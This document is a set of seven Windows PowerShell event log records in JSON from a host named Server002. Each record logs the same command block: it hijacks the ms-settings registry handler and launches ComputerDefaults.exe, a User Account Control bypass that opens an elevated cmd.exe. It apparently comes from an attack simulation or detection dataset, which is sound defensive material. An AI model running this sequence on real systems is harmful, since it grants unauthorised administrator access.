{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:39:58.5510656"},"EventRecordID":"1043","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=6a4538ce-2874-4afd-b60a-732c5fbd9fc2\r\n\tHostApplication=powershell.exe &amp; {New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\r\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\r\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\r\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:39:58.5510656"},"EventRecordID":"1044","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=6a4538ce-2874-4afd-b60a-732c5fbd9fc2\r\n\tHostApplication=powershell.exe &amp; {New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\r\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\r\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\r\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:39:58.5510656"},"EventRecordID":"1045","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=6a4538ce-2874-4afd-b60a-732c5fbd9fc2\r\n\tHostApplication=powershell.exe &amp; {New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\r\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\r\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\r\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:39:58.5589140"},"EventRecordID":"1046","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=6a4538ce-2874-4afd-b60a-732c5fbd9fc2\r\n\tHostApplication=powershell.exe &amp; {New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\r\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\r\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\r\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:39:58.5589140"},"EventRecordID":"1047","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=6a4538ce-2874-4afd-b60a-732c5fbd9fc2\r\n\tHostApplication=powershell.exe &amp; {New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\r\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\r\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\r\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:39:58.5589140"},"EventRecordID":"1048","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=6a4538ce-2874-4afd-b60a-732c5fbd9fc2\r\n\tHostApplication=powershell.exe &amp; {New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\r\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\r\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\r\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:39:58.6447608"},"EventRecordID":"1049","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=6a4538ce-2874-4afd-b60a-732c5fbd9fc2\r\n\tHostApplication=powershell.exe &amp; {New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\r\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\r\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\r\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=aed1fd2a-2908-4417-9f61-897d605dfa7b\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
